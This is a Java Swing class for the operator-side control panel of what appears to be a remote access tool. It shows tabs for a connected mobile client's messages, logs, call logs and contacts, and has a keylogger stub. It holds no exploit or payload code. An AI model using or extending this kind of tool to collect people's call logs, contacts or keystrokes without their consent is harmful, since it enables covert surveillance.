package subterranean.crimson.server.graphics;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;

import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import subterranean.crimson.server.Server;
import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPLog;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPMessages;
import subterranean.crimson.server.graphics.panels.cp.mobile.CallLogs;
import subterranean.crimson.server.graphics.panels.cp.mobile.Contacts;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.exceptions.InvalidResponseException;
import subterranean.crimson.universal.translation.T;

public class MobileControlPanel extends ControlPanel {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;

	private JTabbedPane globalTabbedPane;

	private JCheckBox chckbxLog;
	private JCheckBox chckbxMessages;

	private ArrayList<TabComponent> tabs = new ArrayList<TabComponent>();

	public MobileControlPanel(Connection con) {
		setPreferredSize(new Dimension(810, 500));
		setMinimumSize(new Dimension(810, 500));
		setBounds(new Rectangle(0, 0, 810, 500));
		if (!Platform.osx) {
			setIconImage(Toolkit.getDefaultToolkit().getImage(DesktopControlPanel.class.getResource("/subterranean/crimson/server/graphics/icons/icon.png")));
		}

		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		c = con;
		setTitle(c.getProfile().info.getHostname() + ": Control Panel");
		setBounds(100, 100, 810, 500);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BorderLayout(0, 0));

		JSplitPane splitPane = new JSplitPane();
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		contentPane.add(splitPane, BorderLayout.CENTER);

		globalTabbedPane = new JTabbedPane(JTabbedPane.LEFT);
		globalTabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
		splitPane.setLeftComponent(globalTabbedPane);
		globalTabbedPane.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				// get name of new tab
				JTabbedPane sourceTabbedPane = (JTabbedPane) arg0.getSource();
				int index = sourceTabbedPane.getSelectedIndex();
				switch (sourceTabbedPane.getTitleAt(index)) {
				case ("Information"): {

					Runnable r = new Runnable() {
						public void run() {
							// if no info exists, get it
							if (c.getProfile().details == null) {
								try {
									c.getProfile().details = ClientCommands.sigar_gather(c);
								} catch (InvalidResponseException e) {
									Logger.add("Could not get detailed information");
									return;
								}

							}
							// print out the information
							for (String s : c.getProfile().details.keySet()) {
								System.out.println("KEY: " + s + " VALUE: " + c.getProfile().details.get(s));

							}

							// update_information();

							// switch the cards
							// CardLayout cardLayout = (CardLayout)
							// information_panel.getLayout();
							// cardLayout.next(information_panel);
						}
					};
					new Thread(r).start();

					break;
				}

				}

			}
		});

		if (Platform.osx) {
			// tabs
			if (Server.getSettings().getDesktopCP().SPMessages) {
				Logger.add("Loading Messages Panel");
				globalTabbedPane.addTab(T.t("cpmenu-messages"), new SPMessages(this));
			}
			if (Server.getSettings().getDesktopCP().SPLog) {
				Logger.add("Loading Log Panel");
				globalTabbedPane.addTab(T.t("cpmenu-log"), new SPLog(this));
			}
			if (Server.getSettings().getMobileCP().callLog) {
				Logger.add("Loading Call Log Panel");
				globalTabbedPane.addTab(T.t("cpmenu-call_log"), new CallLogs(this));
			}
			if (Server.getSettings().getMobileCP().contacts) {
				Logger.add("Loading Contacts Panel");
				globalTabbedPane.addTab(T.t("cpmenu-contacts"), new Contacts(this));
			}

		} else {
			// tabs
			int tabIndex = 0;// this index is incremented after every true 'if' block
			if (Server.getSettings().getDesktopCP().SPMessages) {
				Logger.add("Loading Messages Panel");
				TabComponent messageTC = new TabComponent(this, T.t("cpmenu-messages"), new SPMessages(this));
				tabs.add(messageTC);
				globalTabbedPane.addTab(null, messageTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, messageTC);
			}

			if (Server.getSettings().getDesktopCP().SPLog) {
				Logger.add("Loading Log Panel");
				TabComponent clientLogTC = new TabComponent(this, T.t("cpmenu-log"), new SPLog(this));
				tabs.add(clientLogTC);
				globalTabbedPane.addTab(null, clientLogTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, clientLogTC);
			}

			if (Server.getSettings().getMobileCP().callLog) {
				Logger.add("Loading Call Log Panel");
				TabComponent messageTC = new TabComponent(this, T.t("cpmenu-call_log"), new CallLogs(this));
				tabs.add(messageTC);
				globalTabbedPane.addTab(null, messageTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, messageTC);
			}
			if (Server.getSettings().getMobileCP().contacts) {
				Logger.add("Loading Contacts Panel");
				TabComponent messageTC = new TabComponent(this, T.t("cpmenu-contacts"), new Contacts(this));
				tabs.add(messageTC);
				globalTabbedPane.addTab(null, messageTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, messageTC);
			}

		}
		JPanel console = new JPanel();
		splitPane.setRightComponent(console);
		console.setLayout(new BorderLayout(0, 0));

		cpconsole = new CPConsole();
		console.add(cpconsole, BorderLayout.CENTER);

		splitPane.setDividerLocation(400);

		JMenuBar menuBar_1 = new JMenuBar();
		contentPane.add(menuBar_1, BorderLayout.NORTH);

		JMenu mnPanels = new JMenu("Panels");
		menuBar_1.add(mnPanels);

		JMenuItem mntmRestoreAllTabs = new JMenuItem("Restore All Tabs");
		mnPanels.add(mntmRestoreAllTabs);

		JMenu mnView = new JMenu(T.t("menu-view"));
		mnPanels.add(mnView);

		chckbxMessages = new JCheckBox(T.t("cpmenu-messages"));
		chckbxMessages.setSelected(Server.getSettings().getDesktopCP().SPMessages);
		chckbxMessages.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxMessages);

		chckbxLog = new JCheckBox(T.t("cpmenu-log"));
		chckbxLog.setSelected(Server.getSettings().getDesktopCP().SPLog);
		chckbxLog.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxLog);

		consoleAppend(T.t("console-init"));
	}

	@Override
	public void updateTransfers() {
		// TODO Auto-generated method stub

	}

	@Override
	public void updateKeylogger() {
		// TODO Auto-generated method stub

	}

	public void detachTab(TabComponent tc) {
		Logger.add("Detaching Tab");
		for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
			if (tc == globalTabbedPane.getTabComponentAt(i)) {
				SeparateWindow sw = new SeparateWindow((JPanel) globalTabbedPane.getComponentAt(i));
				sw.setVisible(true);

				updateTabViews();
				return;
			}
		}
	}

	public void closeTab(TabComponent tc) {
		Logger.add("Closing Tab");
		for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
			if (tc == globalTabbedPane.getTabComponentAt(i)) {

				globalTabbedPane.remove(i);
				updateTabViews();
				return;
			}
		}
	}

	public void updateTabViews() {
		// deselect all

		chckbxLog.setSelected(false);
		chckbxMessages.setSelected(false);

		// reset memory

		Server.getSettings().getMobileCP().SPLog = false;
		Server.getSettings().getMobileCP().SPMessages = false;
		Server.getSettings().getMobileCP().callLog = false;
		Server.getSettings().getMobileCP().contacts = false;

		for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
			TabComponent tc = (TabComponent) globalTabbedPane.getTabComponentAt(i);
			switch (tc.cpanel.getPanelName()) {

			case "Log": {
				chckbxLog.setSelected(true);
				Server.getSettings().getDesktopCP().SPLog = true;
			}
			case "Messages": {
				chckbxMessages.setSelected(true);
				Server.getSettings().getDesktopCP().SPMessages = true;
			}

			}

		}
	}

	@Override
	public void refreshControls() {
		// TODO Auto-generated method stub

	}
}
